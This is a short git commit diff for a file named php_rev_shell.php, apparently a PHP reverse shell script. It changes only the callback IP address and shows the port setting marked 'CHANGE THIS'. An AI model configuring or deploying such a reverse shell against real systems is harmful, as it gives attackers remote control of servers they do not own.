c1e9032a06d3a3046c2b0b7a2996460d890a5329
ChiamYJ <cyjien@hotmail.com>
2018-09-15 21:59:15 +0800

    Update php_rev_shell.php

--- php_rev_shell.php
+++ php_rev_shell.php
@@ -46,7 +46,7 @@
 
 set_time_limit (0);
 $VERSION = "1.0";
-$ip = '192.168.0.167';  // CHANGE THIS
+$ip = '192.168.0.182';  // CHANGE THIS
 $port = 1234;       // CHANGE THIS
 $chunk_size = 1400;
 $write_a = null;
